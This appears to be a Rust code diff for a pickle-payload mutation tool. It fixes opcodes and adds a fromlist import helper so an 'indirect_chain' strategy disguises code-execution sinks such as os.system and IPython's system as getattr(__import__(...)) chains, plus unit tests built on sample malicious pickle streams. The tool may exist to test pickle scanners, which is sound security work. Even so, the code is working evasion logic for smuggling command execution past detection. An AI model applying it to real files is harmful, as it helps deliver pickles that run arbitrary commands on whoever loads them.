@@ -7,20 +7,31 @@ use rand::thread_rng;
 
 const MARK: u8 = 0x28;
 const POP: u8 = 0x29;
-const TUPLE: u8 = 0x8e;
-const REDUCE: u8 = 0xb0;
+const TUPLE: u8 = 0x74;    // NOT 0x8e (that is BINBYTES8)
+const REDUCE: u8 = 0x52;
 const STOP: u8 = 0x2e;
 const SHORT_BINUNICODE: u8 = 0x8c;
-const BINUNICODE: u8 = 0x8d;
-const BINBYTES: u8 = 0x85;
+const BINUNICODE: u8 = 0x58;   // 4-byte length (NOT 0x8d, which is BINUNICODE8)
+const BINBYTES: u8 = 0x42;     // 4-byte length (NOT 0x85, which is TUPLE1)
 const GLOBAL: u8 = 0x63;
 const STACK_GLOBAL: u8 = 0x93;
+const NONE: u8 = 0x4e;
+const EMPTY_LIST: u8 = 0x5d;
+const APPEND: u8 = 0x61;
 
 fn encode_short_binunicode(s: &str) -> Vec<u8> {
     let data = s.as_bytes();
     let mut out = vec![SHORT_BINUNICODE];
     out.push(data.len().min(255) as u8);
     out.extend_from_slice(&data[..data.len().min(255)]);
+    out
+}
+
+fn encode_binunicode(s: &str) -> Vec<u8> {
+    let data = s.as_bytes();
+    let mut out = vec![BINUNICODE];
+    out.extend_from_slice(&(data.len() as u32).to_le_bytes());
+    out.extend_from_slice(data);
     out
 }
 
@@ -37,12 +48,20 @@ fn binbytes_tuple(payload: &[u8]) -> Vec<u8> {
     out
 }
 
-fn args_tuple_bytes(args: &[&[u8]]) -> Vec<u8> {
+/// Protocol-2 tuple region ``(module, None, None, [name])`` without memo
+/// opcodes (BINPUT writes are optional; no BINGET references them). This is
+/// what ``__import__`` needs to resolve a *dotted* module to its leaf -- a
+/// plain ``(module,)`` tuple returns the top-level package, so
+/// ``getattr(__import__('IPython.utils.process'), 'system')`` would fail.
+fn fromlist_import_args(module: &str, name: &str) -> Vec<u8> {
     let mut out = Vec::new();
     out.push(MARK);
-    for arg in args {
-        out.extend_from_slice(arg);
-    }
+    out.extend_from_slice(&encode_binunicode(module));
+    out.push(NONE);
+    out.push(NONE);
+    out.push(EMPTY_LIST);
+    out.extend_from_slice(&encode_binunicode(name));
+    out.push(APPEND);
     out.push(TUPLE);
     out
 }
@@ -193,12 +212,20 @@ make_strategy!(IndirectChain, "indirect_chain", |pkl_bytes: &[u8]| {
             if fields.len() >= 2 {
                 let module = canonical_module(std::str::from_utf8(fields[0]).unwrap_or(""));
                 let fname = std::str::from_utf8(fields[1]).unwrap_or("");
+                // Leave smuggling primitives untouched (they resolve the chain
+                // itself; rewriting them would recurse or corrupt the stream).
+                if module == "builtins" && (fname == "getattr" || fname == "__import__") {
+                    parts.push(opcode.classification.code);
+                    parts.extend_from_slice(&opcode.arg);
+                    continue;
+                }
+                // getattr(__import__(module, None, None, [name]), name)
                 parts.push(GLOBAL);
                 parts.extend_from_slice(b"builtins\ngetattr\n");
                 parts.push(MARK);
                 parts.push(GLOBAL);
                 parts.extend_from_slice(b"builtins\n__import__\n");
-                parts.extend_from_slice(&args_tuple_bytes(&[module.as_bytes()]));
+                parts.extend_from_slice(&fromlist_import_args(module, fname));
                 parts.push(REDUCE);
                 parts.extend_from_slice(&encode_short_binunicode(fname));
                 parts.push(TUPLE);
@@ -450,4 +477,60 @@ pub fn apply_pipeline(pkl_bytes: &[u8], names: &[&str]) -> Vec<u8> {
         }
     }
     cur
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// A dotted sink (``IPython.utils.process.system``) must be rewritten to a
+    /// ``fromlist`` import chain so ``__import__`` returns the leaf module.
+    /// Regression for: `AttributeError: module 'IPython' has no attribute 'system'`.
+    #[test]
+    fn indirect_chain_uses_fromlist_for_dotted_module() {
+        let stream = b"cIPython.utils.process\nsystem\n(X\x03\x00\x00\x00trueq\x00tq\x01R.";
+        let strategy = get_strategy("indirect_chain").unwrap();
+        let out = strategy.apply(stream);
+        let s = String::from_utf8_lossy(&out);
+        // builtins.__import__ + fromlist args tuple + builtins.getattr
+        assert!(s.contains("builtins\n__import__\n"), "chain must import via __import__");
+        assert!(s.contains("builtins\ngetattr\n"), "chain must resolve via getattr");
+        assert!(s.contains("IPython.utils.process"), "dotted module name kept");
+        // fromlist 4-tuple: (module, None, None, [name]) -> NONE NONE EMPTY_LIST
+        assert!(
+            out.windows(3).any(|w| w == [NONE, NONE, EMPTY_LIST]),
+            "fromlist tuple must carry (module, None, None, [name])"
+        );
+    }
+
+    /// The fromlist args region must encode a 4-tuple ``(module, None, None, [name])``:
+    /// MARK, BINUNICODE(module), NONE, NONE, EMPTY_LIST, BINUNICODE(name), APPEND, TUPLE.
+    #[test]
+    fn fromlist_import_args_shape() {
+        let blob = fromlist_import_args("os", "system");
+        assert_eq!(blob[0], MARK);
+        assert_eq!(blob[1], BINUNICODE);
+        // os: 2-byte payload after the 4-byte length prefix
+        assert_eq!(blob[2..6], [2, 0, 0, 0]);
+        assert_eq!(&blob[6..8], b"os");
+        assert_eq!(blob[8], NONE);
+        assert_eq!(blob[9], NONE);
+        assert_eq!(blob[10], EMPTY_LIST);
+        assert_eq!(blob[11], BINUNICODE);
+        // "system": 6-byte payload after the length prefix
+        assert_eq!(blob[12..16], [6, 0, 0, 0]);
+        assert_eq!(&blob[16..22], b"system");
+        assert_eq!(blob[22], APPEND);
+        assert_eq!(blob[23], TUPLE);
+    }
+
+    /// Smuggling primitives that resolve the chain itself must be left as-is.
+    #[test]
+    fn indirect_chain_skips_smuggling_globals() {
+        let stream = b"cbuiltins\ngetattr\n(X\x03\x00\x00\x00abcq\x00tq\x01R.";
+        let strategy = get_strategy("indirect_chain").unwrap();
+        let out = strategy.apply(stream);
+        // no change: the single GLOBAL is a smuggling primitive, not a sink
+        assert_eq!(out, stream.to_vec());
+    }
 }
